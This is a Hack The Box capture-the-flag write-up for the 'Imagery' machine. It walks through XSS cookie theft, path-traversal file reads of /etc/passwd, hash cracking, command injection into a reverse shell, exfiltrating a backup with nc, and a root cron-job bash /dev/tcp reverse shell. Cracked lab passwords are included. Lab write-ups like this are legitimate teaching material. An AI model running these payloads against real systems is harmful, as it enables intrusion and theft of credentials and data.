---
{"publish":true,"created":"2025-09-28T11:05:25.855+05:30","modified":"2026-01-25T00:43:50.923+05:30","published":"2026-01-25T00:43:50.923+05:30","tags":["medium","command-injection","linux"],"cssclasses":"","api":"https://labs.hackthebox.com/achievement/machine/1454964/751"}
---

## Information Gathering

```shell
$ nmap 10.10.11.88 -sV -sC -p- --min-rate=10000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 11:07 IST
Nmap scan report for 10.10.11.88
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.50 seconds
```

The deliberately placed file upload feature was a rabbit hole. The attack surface was here:

![[Machines/png/imagery_report_a_bug.png]]

Because normally you'd assume that the links at the bottom of a typical CTF redirect nowhere :D

The "Report Bug" quick link appears only after registering.

![[Machines/png/imagery_xss.png]]

```shell
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.88 - - [28/Sep/2025 12:06:30] "GET /?cookieleak=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNjRPw.urvC4MwkXHyc3tkAMxFEUwyNGQM HTTP/1.1" 200 -
10.10.11.88 - - [28/Sep/2025 12:06:31] "GET /?cookieleak=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNjRPw.urvC4MwkXHyc3tkAMxFEUwyNGQM HTTP/1.1" 200 -
10.10.11.88 - - [28/Sep/2025 12:06:31] "GET /?cookieleak=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNjRPw.urvC4MwkXHyc3tkAMxFEUwyNGQM HTTP/1.1" 200 -
```

A useful cookie: `session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNjRPw.urvC4MwkXHyc3tkAMxFEUwyNGQM`

Lets see whose gallery this is.

![[Machines/png/imagery_use_cookie.png]]

Hit refresh

![[Machines/png/imagery_admin_panel_revealed.png]]

Cookie belongs to some admin user, and we can see an admin panel on the top right.

## Initial Access

![[Machines/png/imagery_log_download.png]]

The "Download Log" button fetches logs from this endpoint

![[Machines/png/logdownload_imagery.png]]

Trying LFI here :D

![[Machines/png/imagery_lfi_fuzzing.png]]

![[Machines/png/imagery_lfi_success.png]]

```shell
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: imagery.htb:8000' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://imagery.htb:8000/' -H $'Accept-Encoding: gzip, deflate, br' -H $'If-None-Match: \"1759040228.3583899-2137-2828407261\"' -H $'Connection: keep-alive' \
    -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNjYwA.kVyHDAUB43G5M-6j2GOoR1yekDs' \
    $'http://imagery.htb:8000/admin/get_system_log?log_identifier=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

This reveals a user 'mark'. But we need more information to get a shell. The following file reveals the command line arguments of the current process.

![[Machines/png/cmdline_imagery.png]]

List of useful files to expose using LFI:

- `/home/web/web/app.py`
- `/home/web/web/config.py`

`config.py` exposed the name of the file that acts as the database:

![[Machines/png/dbjson_exposed_imagery.png]]

We also see and realize that exploiting file upload would've been a waste of time

![[Machines/png/file_upload_wasteoftime_imagery.png]]

Lol. Moving on!

Upon exposing the contents of `db.json`, we find the password hashes of "testuser" and "admin".

![[Machines/png/passwdhash_imagery.png]]

A quick search on crackstation reveals the password

![[Machines/png/testuser_password_imagery.png]]

Don't seem to get anywhere at this point, why not login as the testuser and have a look at their gallery?

Unlike a typical user, the testuser is able to use these features

![[Machines/png/features_unlocked_imagery.png]]

`/home/web/web/config.py` revealed earlier the usage of `/usr/bin/convert` and `/usr/bin/exiftool`. Interesting. Maybe it is related to these new features that we didn't have earlier?

Lets check for CVEs

![[Machines/png/exiftool_version_imagery.png]]

No public exploit available.

Lets try to interact with the new features anyway.

![[Machines/png/transform_image_imagery.png]]

I applied the "transform" on my image, and this the request:

![[Machines/png/transform_request_imagery.png]]

Lets test the parameters

![[Machines/png/testparams_imagery.png]]

We got a message, maybe we could interact with the environment from here?

Interacting with the "crop" transform functionality this time

![[Machines/png/crop_imagery_cmdi.png]]

Command injection confirmed. Lets get a reverse shell

![[Machines/png/imagery_reverse_shell.png]]

```shell
$ nc -vlnp 4444
listening on [any] 4444 ...
connect to [10.10.16.35] from (UNKNOWN) [10.10.11.88] 34266
bash: cannot set terminal process group (1365): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$
```

## Privilege Escalation

```shell
web@Imagery:~/web$ ./linpeas.sh
```

```shell
web@Imagery:~/web$ find / -perm -4000 2> /dev/null
<...>
/opt/google/chrome/chrome-sandbox
```

```shell
<...>
╔══════════╣ Backup folders
drwx------ 2 root root 4096 Sep 22 19:10 /etc/lvm/backup
drwxr-xr-x 2 root root 3 Apr 18  2022 /snap/core22/2045/var/backups
total 0

drwxr-xr-x 2 root root 3 Apr 18  2022 /snap/core22/2133/var/backups
total 0

drwxr-xr-x 3 root root 4096 Oct  7  2024 /usr/lib/python3/dist-packages/botocore/data/backup
total 4
drwxr-xr-x 2 root root 4096 Oct  7  2024 2018-11-15

drwxr-xr-x 2 root root 4096 Sep 22 18:56 /var/backup
total 22516
-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
<...>cd 
```

```shell
web@Imagery:/var/backup$ cat web_20250806_120723.zip.aes | nc 10.10.16.35 6666
```

```shell
$ nc -lvnp 6666 > backup.zip.aes
$ file backup.zip.aes
backup.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

[pyAesBrute/pybrute.py at main · wyn-cmd/pyAesBrute · GitHub](https://github.com/wyn-cmd/pyAesBrute/blob/main/pybrute.py)

```shell
$ python pybrute.py /usr/share/wordlists/rockyou.txt ../backup.zip.aes backup.zip
***brute forcing file...***
  ***file decrypted***
password: {bestfriends}
time taken: 7.70446252822876
86.83279301428463 passwords per second
```

```shell
$ unzip backup.zip
$ cat web/db.json
<...>
{
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
<...>
```

Back to crackstation

![[Machines/png/web_mark_creds_imagery.png]]

Valid credentials: `web:spiderweb1234`.
Lets see if the other password works for mark.

```shell
web@Imagery:~$ su mark
su mark
Password: supersmash

mark@Imagery:/home/web$
```

Yes :D

```shell
mark@Imagery:~$ sudo -l
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Only path left now.

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol --help
sudo /usr/local/bin/charcol --help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```

This must be the binary that created the backup file from earlier.

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol shell
sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██
 ░██   ░░██ ░██                                                  ░██
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██



Charcol The Backup Suit - Development edition 1.0.0

[2025-09-28 14:31:09] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
```

But it prompts for some "application" password, which we don't know. Luckily we can run as sudo to reset the password like so

```shell
mark@Imagery:~$ sudo /usr/local/bin/charcol -R
sudo /usr/local/bin/charcol -R

Attempting to reset Charcol application password to default.
[2025-09-28 14:58:02] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2025-09-28 14:58:12] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
mark@Imagery:~$
```

Lets explore.

```shell
charcol> backup -i /root/root.txt
backup -i /root/root.txt
[2025-09-28 14:37:38] [INFO] No encryption password provided and application is in 'no password' mode. Creating unencrypted archive.
[2025-09-28 14:37:38] [INFO] No output file specified. Using input file name as base: root.txt
[2025-09-28 14:37:38] [INFO] Timestamp added to output filename: root.txt_20250928_143738
[2025-09-28 14:37:38] [INFO] Output file will be: /var/backup/root.txt_20250928_143738.zip
[2025-09-28 14:37:38] [INFO] Creating temporary archive: root.txt_20250928_143738.zip of type zip...
[2025-09-28 14:37:38] [ERROR] Blocking access to path '/root/root.txt' as it is within or is a critical directory '/root'
[2025-09-28 14:37:38] [ERROR] Operation aborted: Input path '/root/root.txt' is a blocked critical system location. Skipping this path.
[2025-09-28 14:37:38] [INFO] Temporary archive created successfully at root.txt_20250928_143738.zip
[2025-09-28 14:37:38] [INFO] Set permissions for temporary archive file to 0o664
[2025-09-28 14:37:38] [INFO] Set ownership for temporary archive file to root:root
[2025-09-28 14:37:38] [INFO] Moving unencrypted archive to final destination: /var/backup/root.txt_20250928_143738.zip...
[2025-09-28 14:37:38] [INFO] Unencrypted backup saved to: /var/backup/root.txt_20250928_143738.zip
[2025-09-28 14:37:38] [INFO] Set permissions for final output file to 0o664
[2025-09-28 14:37:38] [INFO] Set ownership for final output file to root:root
charcol>
```

Can't directly obtain the root folder, its "blocked" by Charcol. Need to find another way.

Reading the help page, I figured out that you can run commands using `auto add` with `--command`.

```shell
charcol> auto add --schedule '* * * * *' --command "bash -c 'bash -i >& /dev/tcp/10.10.16.35/7777 0>&1'" --name "laughtersec"
<ev/tcp/10.10.16.35/7777 0>&1'" --name "laughtersec"
[2025-09-28 15:30:47] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm:
supersmash

[2025-09-28 15:30:51] [INFO] System password verified successfully.
[2025-09-28 15:30:51] [INFO] Auto job 'laughtersec' (ID: aa8b78cd-5251-4224-a5ca-370dd8afef91) added successfully. The job will run according to schedule.
[2025-09-28 15:30:51] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true bash -c 'bash -i >& /dev/tcp/10.10.16.35/7777 0>&1'
charcol>
```

```shell
$ rlwrap nc -vlnp 7777
listening on [any] 7777 ...
connect to [10.10.16.35] from (UNKNOWN) [10.10.11.88] 33618
bash: cannot set terminal process group (167637): Inappropriate ioctl for device
bash: no job control in this shell
root@Imagery:~#
root@Imagery:~# cat root.txt
```





